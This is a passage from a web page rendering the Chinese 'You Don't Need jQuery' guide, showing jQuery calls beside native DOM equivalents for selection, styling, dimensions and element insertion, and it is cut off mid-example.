class 查询"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#1.1">1.1</a> class 查询</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$(&#x27;.class&#x27;);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">document.querySelectorAll(&#x27;.class&#x27;);</span><br><span class="line"></span><br><span class="line">// or</span><br><span class="line">document.getElementsByClassName(&#x27;class&#x27;);</span><br></pre></td></tr></table></figure></li><li><h4 id="1-2-id-查询"><a href="#1-2-id-查询" class="headerlink" title="1.2 id 查询"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#1.2">1.2</a> id 查询</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$(&#x27;#id&#x27;);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">document.querySelector(&#x27;#id&#x27;);</span><br><span class="line"></span><br><span class="line">// or</span><br><span class="line">document.getElementById(&#x27;id&#x27;);</span><br></pre></td></tr></table></figure></li><li><h4 id="1-3-属性查询"><a href="#1-3-属性查询" class="headerlink" title="1.3 属性查询"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#1.3">1.3</a> 属性查询</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$(&#x27;a[target=_blank]&#x27;);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">document.querySelectorAll(&#x27;a[target=_blank]&#x27;);</span><br></pre></td></tr></table></figure></li><li><h4 id="1-4-后代查询"><a href="#1-4-后代查询" class="headerlink" title="1.4 后代查询"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#1.4">1.4</a> 后代查询</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.find(&#x27;li&#x27;);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.querySelectorAll(&#x27;li&#x27;);</span><br></pre></td></tr></table></figure></li><li><h4 id="1-5-兄弟及上下元素"><a href="#1-5-兄弟及上下元素" class="headerlink" title="1.5 兄弟及上下元素"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#1.5">1.5</a> 兄弟及上下元素</h4><ul><li><h5 id="兄弟元素"><a href="#兄弟元素" class="headerlink" title="兄弟元素"></a>兄弟元素</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.siblings();</span><br><span class="line"></span><br><span class="line">// Native - latest, Edge13+</span><br><span class="line">[...el.parentNode.children].filter((child) =&gt;</span><br><span class="line">  child !== el</span><br><span class="line">);</span><br><span class="line">// Native (alternative) - latest, Edge13+</span><br><span class="line">Array.from(el.parentNode.children).filter((child) =&gt;</span><br><span class="line">  child !== el</span><br><span class="line">);</span><br><span class="line">// Native - IE10+</span><br><span class="line">Array.prototype.filter.call(el.parentNode.children, (child) =&gt;</span><br><span class="line">  child !== el</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><h5 id="上一个元素"><a href="#上一个元素" class="headerlink" title="上一个元素"></a>上一个元素</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.prev();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.previousElementSibling;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><h5 id="下一个元素"><a href="#下一个元素" class="headerlink" title="下一个元素"></a>下一个元素</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// next</span><br><span class="line">$el.next();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.nextElementSibling;</span><br></pre></td></tr></table></figure></li></ul></li><li><h4 id="1-6-Closest"><a href="#1-6-Closest" class="headerlink" title="1.6 Closest"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#1.6">1.6</a> Closest</h4><p>Closest 获得匹配选择器的第一个祖先元素，从当前元素开始沿 DOM 树向上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.closest(queryString);</span><br><span class="line"></span><br><span class="line">// Native - Only latest, NO IE</span><br><span class="line">el.closest(selector);</span><br><span class="line"></span><br><span class="line">// Native - IE10+</span><br><span class="line">function closest(el, selector) &#123;</span><br><span class="line">  const matchesSelector = el.matches || el.webkitMatchesSelector || el.mozMatchesSelector || el.msMatchesSelector;</span><br><span class="line"></span><br><span class="line">  while (el) &#123;</span><br><span class="line">    if (matchesSelector.call(el, selector)) &#123;</span><br><span class="line">      return el;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      el = el.parentElement;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h4 id="1-7-Parents-Until"><a href="#1-7-Parents-Until" class="headerlink" title="1.7 Parents Until"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#1.7">1.7</a> Parents Until</h4><p>获取当前每一个匹配元素集的祖先，不包括匹配元素的本身。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.parentsUntil(selector, filter);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">function parentsUntil(el, selector, filter) &#123;</span><br><span class="line">  const result = [];</span><br><span class="line">  const matchesSelector = el.matches || el.webkitMatchesSelector || el.mozMatchesSelector || el.msMatchesSelector;</span><br><span class="line"></span><br><span class="line">  // match start from parent</span><br><span class="line">  el = el.parentElement;</span><br><span class="line">  while (el &amp;&amp; !matchesSelector.call(el, selector)) &#123;</span><br><span class="line">    if (!filter) &#123;</span><br><span class="line">      result.push(el);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      if (matchesSelector.call(el, filter)) &#123;</span><br><span class="line">        result.push(el);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    el = el.parentElement;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h4 id="1-8-Form"><a href="#1-8-Form" class="headerlink" title="1.8 Form"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#1.8">1.8</a> Form</h4><ul><li><p>Input&#x2F;Textarea</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$(&#x27;#my-input&#x27;).val();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">document.querySelector(&#x27;#my-input&#x27;).value;</span><br></pre></td></tr></table></figure></li><li><p>获取 e.currentTarget 在 <code>.radio</code> 中的数组索引</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$(&#x27;.radio&#x27;).index(e.currentTarget);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">Array.prototype.indexOf.call(document.querySelectorAll(&#x27;.radio&#x27;), e.currentTarget);</span><br></pre></td></tr></table></figure></li></ul></li><li><h4 id="1-9-Iframe-Contents"><a href="#1-9-Iframe-Contents" class="headerlink" title="1.9 Iframe Contents"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#1.9">1.9</a> Iframe Contents</h4><p>jQuery 对象的 iframe <code>contents()</code> 返回的是 iframe 内的 <code>document</code></p><ul><li><p>Iframe contents</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$iframe.contents();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">iframe.contentDocument;</span><br></pre></td></tr></table></figure></li><li><p>Iframe Query</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$iframe.contents().find(&#x27;.css&#x27;);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">iframe.contentDocument.querySelectorAll(&#x27;.css&#x27;);</span><br></pre></td></tr></table></figure></li></ul></li><li><h4 id="1-10-获取-body"><a href="#1-10-获取-body" class="headerlink" title="1.10 获取 body"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#1.10">1.10</a> 获取 body</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$(&#x27;body&#x27;);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">document.body;</span><br></pre></td></tr></table></figure></li><li><h4 id="1-11-获取或设置属性"><a href="#1-11-获取或设置属性" class="headerlink" title="1.11 获取或设置属性"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#1.11">1.11</a> 获取或设置属性</h4><ul><li><p>获取属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.attr(&#x27;foo&#x27;);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.getAttribute(&#x27;foo&#x27;);</span><br></pre></td></tr></table></figure></li><li><p>设置属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery, note that this works in memory without change the DOM</span><br><span class="line">$el.attr(&#x27;foo&#x27;, &#x27;bar&#x27;);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.setAttribute(&#x27;foo&#x27;, &#x27;bar&#x27;);</span><br></pre></td></tr></table></figure></li><li><p>获取 <code>data-</code> 属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.data(&#x27;foo&#x27;);</span><br><span class="line"></span><br><span class="line">// Native (use `getAttribute`)</span><br><span class="line">el.getAttribute(&#x27;data-foo&#x27;);</span><br><span class="line"></span><br><span class="line">// Native (use `dataset` if only need to support IE 11+)</span><br><span class="line">el.dataset[&#x27;foo&#x27;];</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="CSS-amp-Style"><a href="#CSS-amp-Style" class="headerlink" title="CSS &amp; Style"></a>CSS &amp; Style</h2><ul><li><h4 id="2-1-CSS"><a href="#2-1-CSS" class="headerlink" title="2.1 CSS"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#2.1">2.1</a> CSS</h4><ul><li><p>Get style</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.css(&quot;color&quot;);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">// 注意：此处为了解决当 style 值为 auto 时，返回 auto 的问题</span><br><span class="line">const win = el.ownerDocument.defaultView;</span><br><span class="line"></span><br><span class="line">// null 的意思是不返回伪类元素</span><br><span class="line">win.getComputedStyle(el, null).color;</span><br></pre></td></tr></table></figure></li><li><p>Set style</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.css(&#123; color: &quot;#ff0011&quot; &#125;);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.style.color = &#x27;#ff0011&#x27;;</span><br></pre></td></tr></table></figure></li><li><p>Get&#x2F;Set Styles</p><p>注意，如果想一次设置多个 style，可以参考 oui-dom-utils 中 <a href="https://github.com/oneuijs/oui-dom-utils/blob/master/src/index.js#L194">setStyles</a> 方法</p></li><li><p>Add class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.addClass(className);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.classList.add(className);</span><br></pre></td></tr></table></figure></li><li><p>Remove class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.removeClass(className);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.classList.remove(className);</span><br></pre></td></tr></table></figure></li><li><p>has class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.hasClass(className);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.classList.contains(className);</span><br></pre></td></tr></table></figure></li><li><p>Toggle class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.toggleClass(className);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.classList.toggle(className);</span><br></pre></td></tr></table></figure></li></ul></li><li><h4 id="2-2-Width-amp-Height"><a href="#2-2-Width-amp-Height" class="headerlink" title="2.2 Width &amp; Height"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#2.2">2.2</a> Width &amp; Height</h4><p>Width 与 Height 获取方法相同，下面以 Height 为例：</p><ul><li><p>Window height</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// window height</span><br><span class="line">$(window).height();</span><br><span class="line"></span><br><span class="line">// 含 scrollbar</span><br><span class="line">window.document.documentElement.clientHeight;</span><br><span class="line"></span><br><span class="line">// 不含 scrollbar，与 jQuery 行为一致</span><br><span class="line">window.innerHeight;</span><br></pre></td></tr></table></figure></li><li><p>Document height</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$(document).height();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">const body = document.body;</span><br><span class="line">const html = document.documentElement;</span><br><span class="line">const height = Math.max(</span><br><span class="line">  body.offsetHeight,</span><br><span class="line">  body.scrollHeight,</span><br><span class="line">  html.clientHeight,</span><br><span class="line">  html.offsetHeight,</span><br><span class="line">  html.scrollHeight</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p>Element height</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.height();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">function getHeight(el) &#123;</span><br><span class="line">  const styles = this.getComputedStyle(el);</span><br><span class="line">  const height = el.offsetHeight;</span><br><span class="line">  const borderTopWidth = parseFloat(styles.borderTopWidth);</span><br><span class="line">  const borderBottomWidth = parseFloat(styles.borderBottomWidth);</span><br><span class="line">  const paddingTop = parseFloat(styles.paddingTop);</span><br><span class="line">  const paddingBottom = parseFloat(styles.paddingBottom);</span><br><span class="line">  return height - borderBottomWidth - borderTopWidth - paddingTop - paddingBottom;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 精确到整数（border-box 时为 height - border 值，content-box 时为 height + padding 值）</span><br><span class="line">el.clientHeight;</span><br><span class="line"></span><br><span class="line">// 精确到小数（border-box 时为 height 值，content-box 时为 height + padding + border 值）</span><br><span class="line">el.getBoundingClientRect().height;</span><br></pre></td></tr></table></figure></li></ul></li><li><h4 id="2-3-Position-amp-Offset"><a href="#2-3-Position-amp-Offset" class="headerlink" title="2.3 Position &amp; Offset"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#2.3">2.3</a> Position &amp; Offset</h4><ul><li><p>Position</p><p>获得匹配元素相对父元素的偏移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.position();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">&#123; left: el.offsetLeft, top: el.offsetTop &#125;</span><br></pre></td></tr></table></figure></li><li><p>Offset</p><p>获得匹配元素相对文档的偏移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.offset();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">function getOffset (el) &#123;</span><br><span class="line">  const box = el.getBoundingClientRect();</span><br><span class="line"></span><br><span class="line">  return &#123;</span><br><span class="line">    top: box.top + window.pageYOffset - document.documentElement.clientTop,</span><br><span class="line">    left: box.left + window.pageXOffset - document.documentElement.clientLeft</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><h4 id="2-4-Scroll-Top"><a href="#2-4-Scroll-Top" class="headerlink" title="2.4 Scroll Top"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#2.4">2.4</a> Scroll Top</h4><p>获取元素滚动条垂直位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$(window).scrollTop();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">(document.documentElement &amp;&amp; document.documentElement.scrollTop) || document.body.scrollTop;</span><br></pre></td></tr></table></figure></li></ul><h2 id="DOM-Manipulation"><a href="#DOM-Manipulation" class="headerlink" title="DOM Manipulation"></a>DOM Manipulation</h2><ul><li><h4 id="3-1-Remove"><a href="#3-1-Remove" class="headerlink" title="3.1 Remove"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#3.1">3.1</a> Remove</h4><p>从 DOM 中移除元素。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.remove();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.parentNode.removeChild(el);</span><br><span class="line"></span><br><span class="line">// Native - Only latest, NO IE</span><br><span class="line">el.remove();</span><br></pre></td></tr></table></figure></li><li><h4 id="3-2-Text"><a href="#3-2-Text" class="headerlink" title="3.2 Text"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#3.2">3.2</a> Text</h4><ul><li><p>Get text</p><p>返回指定元素及其后代的文本内容。</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jQuery</span></span><br><span class="line">$el.<span class="keyword">text</span>(<span class="keyword">string</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Native</span></span><br><span class="line">el.textContent = <span class="keyword">string</span>;</span><br></pre></td></tr></table></figure></li><li><p>Set text</p><p>设置元素的文本内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.text(string);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.textContent = string;</span><br></pre></td></tr></table></figure></li></ul></li><li><h4 id="3-3-HTML"><a href="#3-3-HTML" class="headerlink" title="3.3 HTML"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#3.3">3.3</a> HTML</h4><ul><li><p>Get HTML</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.html();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.innerHTML;</span><br></pre></td></tr></table></figure></li><li><p>Set HTML</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.html(htmlString);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.innerHTML = htmlString;</span><br></pre></td></tr></table></figure></li></ul></li><li><h4 id="3-4-Append"><a href="#3-4-Append" class="headerlink" title="3.4 Append"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#3.4">3.4</a> Append</h4><p>Append 插入到子节点的末尾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.append(&quot;&lt;div id=&#x27;container&#x27;&gt;hello&lt;/div&gt;&quot;);</span><br><span class="line"></span><br><span class="line">// Native (HTML string)</span><br><span class="line">el.insertAdjacentHTML(&#x27;beforeend&#x27;, &#x27;&lt;div id=&quot;container&quot;&gt;Hello World&lt;/div&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">// Native (Element)</span><br><span class="line">el.appendChild(newEl);</span><br></pre></td></tr></table></figure></li><li><h4 id="3-5-Prepend"><a href="#3-5-Prepend" class="headerlink" title="3.5 Prepend"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#3.5">3.5</a> Prepend</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.prepend(&quot;&lt;div id=&#x27;container&#x27;&gt;hello&lt;/div&gt;&quot;);</span><br><span class="line"></span><br><span class="line">// Native (HTML string)</span><br><span class="line">el.insertAdjacentHTML(&#x27;afterbegin&#x27;, &#x27;&lt;div id=&quot;container&quot;&gt;Hello World&lt;/div&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">// Native (Element)</span><br><span class="line">el.insertBefore(newEl, el.firstChild);</span><br></pre></td></tr></table></figure></li><li><h4 id="3-6-insertBefore"><a href="#3-6-insertBefore" class="headerlink" title="3.6 insertBefore"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#3.6">3.6</a> insertBefore</h4><p>在选中元素前插入新节点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$newEl.insertBefore(queryString);</span><br><span class="line"></span><br><span class="line">// Native (HTML string)</span><br><span class="line">el.insertAdjacentHTML(&#x27;beforebegin &#x27;, &#x27;&lt;div id=&quot;container&quot;&gt;Hello World&lt;/div&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">// Native (Element)</span><br><span class="line">const el = document.querySelector(selector);</span><br><span class="line">if (el.parentNode) &#123;</span><br><span class="line">  el.parentNode.insertBefore(newEl, el);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h4 id="3-7-insertAfter"><a href="#3-7-insertAfter" class="headerlink" title="3.7 insertAfter"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#3.7">3.7</a> insertAfter</h4><p>在选中元素后插入新节点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$newEl.insertAfter(queryString);</span><br><span class="line"></span><br><span class="line">// Native (HTML string)</span><br><span class="line">el.insertAdjacentHTML(&#x27;afterend&#x27;, &#x27;&lt;div id=&quot;container&quot;&gt;Hello World&lt;/div&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">// Native (Element)</span><br><span class="line">const el = 